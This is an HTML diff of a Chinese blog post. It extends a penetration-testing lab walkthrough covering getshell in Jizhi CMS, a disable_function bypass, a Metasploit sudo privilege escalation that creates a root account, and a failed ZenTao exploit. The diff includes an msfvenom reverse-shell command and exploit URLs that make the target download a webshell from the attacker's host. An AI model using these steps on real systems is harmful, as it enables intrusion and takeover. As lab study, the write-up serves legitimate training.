@@ -53,13 +53,19 @@
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/10.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/11.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/12.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/18.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/19.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/20.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/21.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/22.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/13.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/14.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/15.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/16.png">
 <meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/17.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/f33996e/23.png">
 <meta property="article:published_time" content="2022-03-23T09:29:44.000Z">
-<meta property="article:modified_time" content="2022-03-23T09:35:08.920Z">
+<meta property="article:modified_time" content="2022-03-25T03:58:07.670Z">
 <meta property="article:author" content="Mamor">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://mamor5409.github.io/posts/f33996e/1.png">
@@ -262,10 +268,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2022-03-23 17:29:44 / 修改时间：17:35:08" itemprop="dateCreated datePublished" datetime="2022-03-23T17:29:44+08:00">2022-03-23</time>
+              <time title="创建时间：2022-03-23 17:29:44" itemprop="dateCreated datePublished" datetime="2022-03-23T17:29:44+08:00">2022-03-23</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-25 11:58:07" itemprop="dateModified" datetime="2022-03-25T11:58:07+08:00">2022-03-25</time>
+              </span>
 
           
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -280,14 +292,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.3k</span>
+              <span>8.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>8 分钟</span>
             </span>
             <div class="post-description"> </div>
 
@@ -305,8 +317,6 @@
 <h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><br>
 
 <p><img src="/posts/f33996e/1.png" alt="1.png"></p>
-<br>
-
 <br>
 
 <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="外网机器-centos7"><a href="#外网机器-centos7" class="headerlink" title="外网机器 centos7"></a>外网机器 centos7</h4><p><code>vim /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
@@ -347,7 +357,7 @@
 <p>然后提示不允许上传 ，用00截断这类的 都被重命名了 最终还是没绕过去</p>
 <p>去网上找了下极致CMS1.8.1版本相关漏洞 看到了这么篇文章 <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9359">https://xz.aliyun.com/t/9359</a></p>
 <p>使用拓展管理插件getshell</p>
-<h4 id><a href="#" class="headerlink" title></a></h4><p><img src="/posts/f33996e/5.png" alt="截图"></p>
+<h4 id="模板编辑插件Getshell"><a href="#模板编辑插件Getshell" class="headerlink" title="模板编辑插件Getshell"></a>模板编辑插件Getshell</h4><p><img src="/posts/f33996e/5.png" alt="截图"></p>
 <p>然后使用这个在线编辑模板</p>
 <p><img src="/posts/f33996e/6.png" alt="截图"></p>
 <p>然后设置一个密码 这里设置为 123321 提交后进入了代码编辑器</p>
@@ -356,7 +366,7 @@
 <p>在index.php写一个phpinfo 然后成功生效</p>
 <p><img src="/posts/f33996e/8.png" alt="截图"></p>
 <p><img src="/posts/f33996e/9.png" alt="截图"></p>
-<p>这样写一个一句话 用蚁剑连一下就可以了</p>
+<h4 id="disable-function绕过"><a href="#disable-function绕过" class="headerlink" title="disable_function绕过"></a>disable_function绕过</h4><p>这样写一个一句话 用蚁剑连一下就可以了</p>
 <p><img src="/posts/f33996e/10.png" alt="截图"></p>
 <p>连上蚁剑之后没法执行命令，看了下phpinfo 禁用了好多函数 之前扫端口的时候扫到了有宝塔，应该是宝塔把函数给禁掉了</p>
 <p><img src="/posts/f33996e/11.png" alt="截图"></p>
@@ -365,7 +375,21 @@
 <p>尝试下蚁剑绕过disable_function的插件</p>
 <p>使用这个<code>php7_GC_UAF</code> 可以成功绕过</p>
 <p><img src="/posts/f33996e/12.png" alt="截图"></p>
-<p>直接上msf</p>
+<h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>后面拿第二台机器shell的时候要在这台机器上起一个ftp，普通权限起不来 然后就过来尝试下提权</p>
+<p>试了下之前爆出的 cve-2021-4034 提权没成功，找下msf自带的提权模块试试</p>
+<p>MSF专门提供了一个查找适用EXP的内置模块<code>Local Exploit Suggester</code> 然后给出了3个建议</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; search suggester</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                      Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                      ---------------  ----    -----  -----------</span><br><span class="line">   0  post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 0, use 0 or use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester                                        </span><br><span class="line"></span><br><span class="line">msf6 auxiliary(server&#x2F;socks_proxy) &gt; use 0</span><br><span class="line">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; options </span><br><span class="line"></span><br><span class="line">Module options (post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester):</span><br><span class="line"></span><br><span class="line">   Name             Current Setting  Required  Description</span><br><span class="line">   ----             ---------------  --------  -----------</span><br><span class="line">   SESSION                           yes       The session to run this modu</span><br><span class="line">                                               le on</span><br><span class="line">   SHOWDESCRIPTION  false            yes       Displays a detailed descript</span><br><span class="line">                                               ion for the available exploi</span><br><span class="line">                                               ts</span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; sessions </span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                 Information           Connection</span><br><span class="line">  --  ----  ----                 -----------           ----------</span><br><span class="line">  2         meterpreter x64&#x2F;lin  www @ localhost.loca  10.10.10.114:3344 -&gt;</span><br><span class="line">            ux                   ldomain (uid&#x3D;1001, g   10.10.10.134:43556</span><br><span class="line">                                 id&#x3D;1001, euid&#x3D;1001,   (10.10.10.134)</span><br><span class="line">                                 egid&#x3D;1001) @ loca...</span><br><span class="line"></span><br><span class="line">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; set session 2</span><br><span class="line">session &#x3D;&gt; 2</span><br><span class="line">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] 10.10.10.134 - Collecting local exploits for x64&#x2F;linux...</span><br><span class="line">[*] 10.10.10.134 - 41 exploit checks are being tried...</span><br><span class="line">[+] 10.10.10.134 - exploit&#x2F;linux&#x2F;local&#x2F;network_manager_vpnc_username_priv_esc: The service is running, but could not be validated.</span><br><span class="line">[+] 10.10.10.134 - exploit&#x2F;linux&#x2F;local&#x2F;ptrace_traceme_pkexec_helper: The target appears to be vulnerable.</span><br><span class="line">[+] 10.10.10.134 - exploit&#x2F;linux&#x2F;local&#x2F;sudo_baron_samedit: The target appears to be vulnerable. sudo 1.8.23 is a vulnerable build.</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(multi&#x2F;recon&#x2F;local_exploit_suggester) &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个pkexec 刚才试过了没成功，试一下sudo的这个</p>
+<p><img src="/posts/f33996e/18.png"></p>
+<p><img src="/posts/f33996e/19.png"></p>
+<p><img src="/posts/f33996e/20.png"></p>
+<p>运行完成后可看到生成了一个新的root账户<code>msf</code> 密码为 <code>nyyqeegzvjyfqa</code> ssh连一下试试  </p>
+<p>然后成功连上ssh 权限为root权限 </p>
+<p><img src="/posts/f33996e/21.png" alt="截图"></p>
+<p>在root目录下发现了一个flag</p>
+<p><img src="/posts/f33996e/22.png" alt="截图"></p>
+<h3 id="横向第二台机器"><a href="#横向第二台机器" class="headerlink" title="横向第二台机器"></a>横向第二台机器</h3><p>直接上msf</p>
 <p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=10.10.10.114 lport=3344 -f elf &gt; 3344.elf</code></p>
 <p><img src="/posts/f33996e/13.png" alt="截图"></p>
 <br>
@@ -389,12 +413,35 @@
 <p><img src="/posts/f33996e/17.png" alt="截图"></p>
 <p>查看源码 发现是 禅道v12.4.2 找下对应漏洞</p>
 <p>下班了 早点回去 明天再搞…</p>
+<hr>
+<p>在网上找了下 只找到了该版本的后台getshell，只能尝试弱口令登录后台了…</p>
+<p><img src="/posts/f33996e/23.png" alt="截图"></p>
+<p>尝试5次自动锁了…然后我看了下wp,发现账号密码是 <code>admin</code>/<code>Admin123</code> 然后去试还是登录失败…(本地没登上去 kali登上去了 无语…)</p>
+<h4 id="ZenTao-后台getshell-失败"><a href="#ZenTao-后台getshell-失败" class="headerlink" title="ZenTao 后台getshell(失败)"></a>ZenTao 后台getshell(失败)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">### Exp</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;client-download-1-&lt;base64 encode webshell download link&gt;-1.html</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;data&#x2F;client&#x2F;1&#x2F;&lt;download link filename&gt;</span><br></pre></td></tr></table></figure>
+
+<p> 需要在外网机器上起一个ftp服务 </p>
+<p><code>python -m pyftpdlib -p 21 -d .</code> 但是现在是普通用户 不知道权限够不够</p>
+<p>蚁剑传一个shell.php的一句话 </p>
+<p>shell地址 <code>ftp://10.0.20.30/shell.php</code>   </p>
+<p>base64 <code>ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA=</code></p>
+<p>构建exp </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;client-download-1-ZnRwOi8vMTAuMC4yMC4zMC9zaGVsbC5waHA&#x3D;&#x3D;-1.html</span><br></pre></td></tr></table></figure>
+
+<p>访问后404 应该是外网机器权限太低 需要提权一下，再回到外网机器进行提权</p>
 <br>
 
-<br>
+<hr>
+<p>提到root后 再回来打这个exp 打算起一个ftp服务 但是没有这个库 而且也没安装pip </p>
+<p>那就考虑使用http去搞</p>
+<p>shell地址 <code>http://10.0.20.30:6688/shell.php</code></p>
+<p>base64 <code>aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
+<p>构造exp <code>http://10.0.20.66:8080/index.php?m=client&amp;f=download&amp;version=1&amp;link=aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA=</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;aHR0cDovLzEwLjAuMjAuMzA6NjY4OC9zaGVsbC5waHA&#x3D;  </span><br><span class="line"># 第一个直接404</span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;MTAuMC4yMC4zMDo5Njk2L3NoZWxsLnBocA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;client-download-1-SFRUUDovLzEwLjAuMjAuMzM6NDU2Ny8xLnBocA&#x3D;&#x3D;-1.html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;client-download-1-MTAuMC4yMC4zMDozMzIxL3NoZWxsLnBocA&#x3D;&#x3D;-1.html  404</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;zentao&#x2F;data&#x2F;client&#x2F;1&#x2F;shell.php</span><br><span class="line"></span><br><span class="line">大写HTTP</span><br><span class="line"></span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA&#x3D;</span><br><span class="line"></span><br><span class="line">HTTP:&#x2F;&#x2F;10.0.20.30:3321&#x2F;shell.php</span><br><span class="line">SFRUUDovLzEwLjAuMjAuMzA6MzMyMS9zaGVsbC5waHA&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.0.20.30:3300&#x2F;1.txt</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA&#x3D;&#x3D;</span><br><span class="line">http:&#x2F;&#x2F;10.0.20.66:8080&#x2F;index.php?m&#x3D;client&amp;f&#x3D;download&amp;version&#x3D;1&amp;link&#x3D;aHR0cDovLzEwLjAuMjAuMzA6MzMwMC8xLnR4dA&#x3D;&#x3D;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<br>
 
+
+<p>尝试了好多次，只会创建一个空的shell.php 下载一句话一直失败 传不上去，然后后续我就在靶机上自行创建了一个一句话，然后访问页面可以正常访问，但是去连蚁剑啥的都连不上……无语</p>
+<p>基本上是第二台靶机的问题了，后面的就没法再继续下去了… </p>
 <h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a target="_blank" rel="noopener" href="https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/">https://n0puple.github.io/2021/07/06/%E6%9E%81%E8%87%B4cms1-7-%E5%90%8E%E5%8F%B0%E4%B8%A4%E5%A4%84getshell/</a></p>
 
     </div>
@@ -518,7 +565,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E6%89%91"><span class="nav-number">1.</span> <span class="nav-text">拓扑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%9C%BA%E5%99%A8-centos7"><span class="nav-number">2.1.</span> <span class="nav-text">外网机器 centos7</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">3.2.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%A4%B1%E8%B4%A5"><span class="nav-number">3.3.</span> <span class="nav-text">文件上传(失败)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">3.4.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">3.5.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="nav-number">3.6.</span> <span class="nav-text">端口扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">4.</span> <span class="nav-text">References</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%93%E6%89%91"><span class="nav-number">1.</span> <span class="nav-text">拓扑</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-number">2.</span> <span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%9C%BA%E5%99%A8-centos7"><span class="nav-number">2.1.</span> <span class="nav-text">外网机器 centos7</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="nav-number">3.</span> <span class="nav-text">外网打点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-number">3.1.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="nav-number">3.2.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E5%A4%B1%E8%B4%A5"><span class="nav-number">3.3.</span> <span class="nav-text">文件上传(失败)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E7%BC%96%E8%BE%91%E6%8F%92%E4%BB%B6Getshell"><span class="nav-number">3.4.</span> <span class="nav-text">模板编辑插件Getshell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disable-function%E7%BB%95%E8%BF%87"><span class="nav-number">3.5.</span> <span class="nav-text">disable_function绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">3.6.</span> <span class="nav-text">提权</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E7%AC%AC%E4%BA%8C%E5%8F%B0%E6%9C%BA%E5%99%A8"><span class="nav-number">4.</span> <span class="nav-text">横向第二台机器</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="nav-number">4.1.</span> <span class="nav-text">添加路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-1"><span class="nav-number">4.2.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ZenTao-%E5%90%8E%E5%8F%B0getshell-%E5%A4%B1%E8%B4%A5"><span class="nav-number">4.3.</span> <span class="nav-text">ZenTao 后台getshell(失败)</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#References"><span class="nav-number">5.</span> <span class="nav-text">References</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -588,12 +635,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">368k</span>
+    <span title="站点总字数">373k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:35</span>
+    <span title="站点阅读时长">5:39</span>
 </div>
 
 <!--
@@ -604,7 +651,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共99.4k字</span>
+  <span class="post-count">博客全站共100.6k字</span>
 </div>
 -->
         
